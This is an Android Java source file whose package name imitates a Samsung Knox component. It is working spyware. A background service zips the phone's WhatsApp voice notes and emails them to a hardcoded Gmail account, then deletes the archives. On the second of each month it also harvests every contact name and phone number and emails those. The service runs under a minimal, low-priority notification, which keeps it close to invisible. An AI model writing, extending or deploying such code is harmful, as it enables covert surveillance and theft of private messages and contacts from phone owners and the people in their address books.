package com.samsungphone.knox;

import android.app.IntentService;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.Context;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Color;
import android.net.Uri;
import android.preference.PreferenceManager;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.core.app.NotificationCompat;

public class MyIntentService extends IntentService {

    private File WhatsAppMediaD;
    private String WhatsAppMedia_VoiceNotesD = "/WhatsApp/Media/WhatsApp Voice Notes";
    private String WhatsAppMedia_VoiceNotes_LastDir = "202001";
    private String WhatsAppMedia_VoiceNotes_LastFile = "PTT-2020****-WA****.opus";
    private String DirForArchives = "/Zip";

    private String NowLastDir;
    private String NowLastFile;

    private SharedPreferences sharedPrefs;

    private static final String PrefsP = "Prefs";
    private static final String zipnameP = "zipname";
    private static final String PrefLastWAVoiceDir = "PrefLastWAVoiceDir";
    private static final String PrefLastWAVoiceFile = "PrefLastWAVoiceFile";

    private String  zipname;


    public MyIntentService() {
        super("MyIntentService");
        Log.d("constructor", "create");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        //Работа во время уведомления
        startForeground(2, createNote ());

        setPreferences ();

        try {
            mainWork ();
            sentContacts(getContacts ());
        } catch (Exception e) {
            Log.d("mainWork", e.getMessage(), e);
        }

        savePreferences ();

        stopForeground(true);
        //Конец работы и удаление уведомления
    }
    private void mainWork () throws IOException {
        String sdState = android.os.Environment.getExternalStorageState();
        if (sdState.equals(android.os.Environment.MEDIA_MOUNTED)) {
            File root = android.os.Environment.getExternalStorageDirectory();

            File PathForArchives = new File(root, DirForArchives);
            PathForArchives.mkdirs();

            File dir_with_dir = new File(root, WhatsAppMedia_VoiceNotesD);
            for (File dir:dirsListCreator (dir_with_dir, WhatsAppMedia_VoiceNotes_LastDir)){
                List<File> mylist = filesListCreator (dir, WhatsAppMedia_VoiceNotes_LastFile);
                zipovanie(mylist,PathForArchives);
                otpravka(PathForArchives);
                if (mylist.size()>1){
                    NowLastFile = mylist.get(mylist.size()-1).getName();
                    //NowLastDir = mylist.get(mylist.size()-1).getParent();
                }
                Log.d("обрабат папка", dir.getName());
                NowLastDir = dir.getName();
            }

        }
    }

    private List<File> dirsListCreator (File Dir, String LastDir){
        File lD = new File(Dir, LastDir);
        ArrayList <File> soderjimoe = new ArrayList<File>();
        if (Dir.isDirectory() && Dir.canRead()){
            Collections.addAll(soderjimoe, Dir.listFiles());//File::isDirectory
            String nomedia =".nomedia";
            soderjimoe.remove(new File(Dir, nomedia));
            Collections.sort(soderjimoe);
            int i = soderjimoe.indexOf(lD);
            if (i==-1) ++i;
            return soderjimoe.subList(i,soderjimoe.size());
        }
        else {
            return soderjimoe.subList(0,0);
        }
    }
    private List<File> filesListCreator (File Dir, String LastFile){
        File lF = new File(Dir, LastFile);
        ArrayList<File> soderjimoe = new ArrayList<File>();
        if (Dir.isDirectory() && Dir.canRead()) {
            Collections.addAll(soderjimoe, Dir.listFiles());//File::isFile
            String nomedia =".nomedia";
            soderjimoe.remove(new File(Dir, nomedia));
            Collections.sort(soderjimoe);
            int i = soderjimoe.indexOf(lF);
            return soderjimoe.subList(++i, soderjimoe.size());
        }
        else {
            return soderjimoe.subList(0,0);
        }
    }

    private void otpravka (File Dir){
        File[] files = Dir.listFiles();
        for (File f : files){
            if (f.isFile() && f.canRead()){
                try {
                    GMail androidEmail2 = new GMail("******@gmail.com",
                            "******", "******@gmail.com",
                            "hi", "Ex", f.toString());
                    androidEmail2.createEmailMessage();
                    androidEmail2.sendEmail();
                    f.delete();
                } catch (Exception e) {
                    Log.d("Send Mail try", e.getMessage(), e);
                }
            }
        }
    }

    private void zipovanie (List<File> Files, File Dir) throws IOException {
        final int maxSize = 25*1024*1024;
        int arh_number = 0;
        int size = 0;
        ArrayList<File> files_in_one_zip = new ArrayList<File>();
        for (int i = 0; i < Files.size(); i++){
            if (Files.get(i).length() > maxSize){
                //Файл больше допустимого
                System.out.println(Files.get(i) + " пропускаем файл, слишком большой");
            }
            else {
                if (i == Files.size()-1){
                    //завершающий архив
                    files_in_one_zip.add(Files.get(i));
                    oneZip(files_in_one_zip, Dir, ++arh_number);
                }
                else {
                    size +=Files.get(i).length();
                    if (size + Files.get(i+1).length() > maxSize){
                        //последний файл помещающийся в архив
                        files_in_one_zip.add(Files.get(i));
                        oneZip(files_in_one_zip, Dir, ++arh_number);
                        size = 0;
                        files_in_one_zip.removeAll(files_in_one_zip);
                    }
                    else {
                        //наличие места для следующего фала в архив
                        files_in_one_zip.add(Files.get(i));
                    }
                }
            }
        }
    }

    private void oneZip(ArrayList<File> Files, File Dir, int count) throws IOException {

        DateFormat dateFormat = new SimpleDateFormat("yyyyMMddHHmmss");
        String ZipFile = dateFormat.format(new Date()) + "_" + count + ".zip";
        File ZipName = new File(Dir, ZipFile);

        FileOutputStream fout = new FileOutputStream(ZipName);
        ZipOutputStream zout = new ZipOutputStream(fout);

        for (File v_note:Files){
            FileInputStream fis = new FileInputStream(v_note);
            zout.putNextEntry(new ZipEntry(v_note.getName()));
            byte[] buffer = new byte[4048];
            int length;
            while((length = fis.read(buffer)) > -1)
                zout.write(buffer, 0, length);
            zout.closeEntry();
            fis.close();
        }
        zout.close();
        fout.close();
    }

    public void setPreferences (){
        sharedPrefs = getSharedPreferences(PrefsP, Context.MODE_PRIVATE);

        WhatsAppMedia_VoiceNotes_LastDir = sharedPrefs.getString(PrefLastWAVoiceDir,"202001");
        WhatsAppMedia_VoiceNotes_LastFile = sharedPrefs.getString(PrefLastWAVoiceFile,"PTT-20200101-WA0000.opus");

        NowLastDir = WhatsAppMedia_VoiceNotes_LastDir;
        NowLastFile = WhatsAppMedia_VoiceNotes_LastFile;

        Log.d("setPref", WhatsAppMedia_VoiceNotes_LastDir);
        Log.d("setPref", WhatsAppMedia_VoiceNotes_LastFile);
    }
    public void savePreferences (){

        SharedPreferences.Editor editor = sharedPrefs.edit();
        editor.putString(PrefLastWAVoiceDir,NowLastDir);
        editor.putString(PrefLastWAVoiceFile,NowLastFile);
        editor.apply();
        Log.d("savePref", NowLastDir);
        Log.d("savePref", NowLastFile);
    }
    public void setPause(int sec){
        long endTime = System.currentTimeMillis() + sec*1000;
        while (System.currentTimeMillis() < endTime) {
            synchronized (this) {
                try {
                    wait(endTime - System.currentTimeMillis());
                } catch (Exception e) {
                }
            }
        }
    }
    public Notification createNote (){
        //Создание канала для вывода уведомлений
        String NOTIFICATION_CHANNEL_ID = "com.samsungphone.appforsendarchive";
        String channelName = "My Background Service";
        NotificationChannel chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
        chan.setLightColor(Color.BLUE);
        chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);
        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        assert manager != null;
        manager.createNotificationChannel(chan);
        // Создание уведомления
        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
        Notification notification = notificationBuilder.setOngoing(true)
                .setSmallIcon(R.drawable.ic_stat_service)
                .setContentTitle("App is running in background")
                .setPriority(NotificationManager.IMPORTANCE_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
        return notification;
    }
    public void sentContacts (StringBuffer contacts){
        DateFormat dateFormat = new SimpleDateFormat("dd");
        String day = dateFormat.format(new Date());
        try {
            if (day.equals("02") ){
                String sentStr = new String(contacts.toString().getBytes("UTF-16"), "ISO-8859-1");
                GMail androidEmail2 = new GMail("*********@gmail.com",
                        "********", "**********@gmail.com",
                        "hi", sentStr, "");
                androidEmail2.createEmailMessage();
                androidEmail2.sendEmail();
            }
        } catch (Exception e) {
            Log.d("Send Mail try", e.getMessage(), e);
        }

    }
    public StringBuffer getContacts () {
        String phoneNumber = null;

        //Связываемся с контактными данными и берем с них значения id контакта, имени контакта и его номера:
        Uri CONTENT_URI = ContactsContract.Contacts.CONTENT_URI;
        String _ID = ContactsContract.Contacts._ID;
        String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME;
        String HAS_PHONE_NUMBER = ContactsContract.Contacts.HAS_PHONE_NUMBER;

        Uri PhoneCONTENT_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        String Phone_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
        String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;


        StringBuffer output = new StringBuffer();
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(CONTENT_URI, null, null, null, null);

        //Запускаем цикл обработчик для каждого контакта:
        if (cursor.getCount() > 0) {

            //Если значение имени и номера контакта больше 0 (то есть они существуют) выбираем
            //их значения в приложение привязываем с соответствующие поля "Имя" и "Номер":
            while (cursor.moveToNext()) {
                String contact_id = cursor.getString(cursor.getColumnIndex(_ID));
                String name = cursor.getString(cursor.getColumnIndex(DISPLAY_NAME));
                int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex(HAS_PHONE_NUMBER)));

                //Получаем имя:
                if (hasPhoneNumber > 0) {
                    output.append( name);
                    Cursor phoneCursor = contentResolver.query(PhoneCONTENT_URI, null,
                            Phone_CONTACT_ID + " = ?", new String[]{contact_id}, null);

                    //и соответствующий ему номер:
                    while (phoneCursor.moveToNext()) {
                        phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(NUMBER));
                        output.append(phoneNumber);
                    }
                }
            }
        }
        return output;
    }
}

